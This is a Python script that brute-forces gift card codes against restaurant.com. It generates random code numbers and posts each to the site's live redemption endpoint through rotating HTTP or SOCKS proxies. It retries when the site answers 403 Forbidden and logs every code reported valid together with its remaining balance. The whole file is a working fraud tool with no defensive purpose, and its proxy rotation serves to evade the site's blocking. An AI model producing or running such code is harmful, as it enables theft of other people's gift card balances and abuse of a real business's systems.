import random, requests, threading, os, datetime, time
from sys import stdout
from colorama import *

red, green, cyan, white, reset = (
    Fore.LIGHTRED_EX,
    Fore.LIGHTGREEN_EX,
    Fore.LIGHTCYAN_EX,
    Fore.WHITE,
    Fore.RESET,
)

pref = f"{white}[{red}>{white}]{reset} "

e = datetime.datetime.now()
current_date = e.strftime("%Y-%m-%d-%H-%M-%S")


def clear():
    if os.name == "nt":
        return os.system("cls")
    else:
        return os.system("clear")


lock = threading.Lock()


def free_print(arg):
    lock.acquire()
    stdout.flush()
    print(arg)
    lock.release()


if not os.path.exists("Results/"):
    os.makedirs("Results/")


class GenChecker:
    codes = []
    proxylist = []
    good = 0
    bad = 0
    cpm1 = 0
    cpm2 = cpm1
    retries = 0

    def __init__(self):
        if not os.path.exists(f"Results/{current_date}/"):
            os.makedirs(f"Results/{current_date}/")
        self.valid_file = f"Results/{current_date}/working-codes.txt"
        clear()
        self.ask_data()
        clear()
        self.threading_part()

    def logo(self):
        print(
            f"""
        {red} █████╗  ████████╗  ██████╗  ███╗   ███╗ ██╗  ██████╗
        ██╔══██╗ ╚══██╔══╝ ██╔═══██╗ ████╗ ████║ ██║ ██╔════╝{reset}
        {white}███████║    ██║    ██║   ██║ ██╔████╔██║ ██║ ██║     
        ██   ██║    ██║    ██║   ██║ ██║╚██╔╝██║ ██║ ██║     
        ██║  ██║    ██║    ╚██████╔╝ ██║ ╚═╝ ██║ ██║ ╚██████╗
        ╚═╝  ╚═╝    ╚═╝     ╚═════╝  ╚═╝     ╚═╝ ╚═╝  ╚═════╝{reset}
        """
        )

    def ask_data(self):
        self.logo()
        os.system(f"title Choose - Atomic Restaurant.com Giftcard Gen + Keker")
        print(
            f"""Proxy Type (ONLY USE USA PROXIES/VPN)
[{cyan}0{reset}] ProxyLess
[{cyan}1{reset}] HTTP/s
[{cyan}2{reset}] Socks4
[{cyan}3{reset}] Socks5"""
        )
        while True:
            self.broxtype = input(f"{pref}")
            if self.broxtype in ("0", "1", "2", "3"):
                break
        if self.broxtype != "0":
            while True:
                print("Proxy File Path")
                proxyfile = input(f"{pref}").replace('"', "")
                if proxyfile != None or proxyfile != "" or proxyfile != " ":
                    self.proxyfile = proxyfile.strip()
                    break
            with open(self.proxyfile, "r+", encoding="utf-8") as f:
                ext = f.readlines()
                self.proxylist.clear()
                for line in ext:
                    line = line.replace("\n", "")
                    self.proxylist.append(line)
        print("Thread Count")
        self.threads = int(input(f"{pref}"))

    def title(self):
        os.system(
            f"title Checking Codes - Checked [{self.good + self.bad}] - Working [{self.good}] - Invalid [{self.bad}] - CPM [{self.cpm2*60}] - Retries [{self.retries}] - Atomic Restaurant.com Giftcard Gen + Keker"
        )
        self.cpm2 = self.cpm1
        self.cpm1 = 0

    def kek_codes(self):
        self.title()
        code = random.randint(1000000000, 2042510069)
        if self.broxtype == "0":
            proxydic = None
        elif self.broxtype == "1":
            proxy_to_use = random.choice(self.proxylist)
            proxydic = {
                "http": f"http://{proxy_to_use}",
                "https": f"http://{proxy_to_use}",
            }

        elif self.broxtype == "2":
            proxy_to_use = random.choice(self.proxylist)
            proxydic = {
                "http": f"socks4://{proxy_to_use}",
                "https": f"socks4://{proxy_to_use}",
            }
        elif self.broxtype == "3":
            proxy_to_use = random.choice(self.proxylist)
            proxydic = {
                "http": f"socks5h://{proxy_to_use}",
                "https": f"socks5h://{proxy_to_use}",
            }
        if code not in self.codes:
            self.codes.append(code)
            content = f"Code={code}&HasRedeemedCode=true&Location=10001&Keyword="
            headers = {
                "Accept": "*/*",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "fr-FR,fr;q=0.9",
                "Connection": "keep-alive",
                "Content-Length": "60",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Host": "www.restaurant.com",
                "Origin": "https://www.restaurant.com",
                "Referer": "https://www.restaurant.com/Redemptions",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin",
                "Sec-GPC": "1",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "X-Requested-With": "XMLHttpRequest",
            }
            try:
                r = requests.post(
                    "https://www.restaurant.com/redemptions/redeem",
                    data=content,
                    headers=headers,
                    proxies=proxydic,
                )

                if '"ResponseCode":"Valid"' in r.text:
                    self.cpm1 += 1
                    balance = r.json()["RemainingBalance"]
                    free_print(f"[{green}WORKING{reset}] {code} | Balance: {balance}")
                    with open(self.valid_file, "a") as f:
                        f.write(f"{code} | Balance: {balance}\n")
                    self.good += 1
                elif "<head><title>403 Forbidden</title></head>" in r.text:
                    self.retries += 1
                    self.cpm1 += 1
                    self.kek_codes()
                else:
                    self.cpm1 += 1
                    free_print(f"[{red}INVALID{reset}] {code}")
                    self.bad += 1

            except:
                self.retries += 1
                self.cpm1 += 1

    def threading_part(self):
        self.logo()
        self.title()
        while True:
            try:
                if threading.active_count() < self.threads:
                    threading.Thread(target=self.kek_codes).start()
            except KeyboardInterrupt:
                break
        while True:
            if threading.active_count() == 0:
                break
            self.title()
            time.sleep(35)
            clear()
            self.send_final()

    def send_final(self):
        self.title()
        self.logo()

        with open(self.valid_file) as f:
            total_count = f.readlines()
        print(
            f"""
{pref}[{cyan}DONE{reset}]
{pref}Working Codes  [{cyan}{self.good}{reset}]
{pref}Invalid Codes  [{cyan}{self.bad}{reset}]
{pref}Checked        [{cyan}{self.bad + self.good}{reset}]"""
        )
        input(f"{pref}Press enter to go back.")
        exit()


GenChecker()
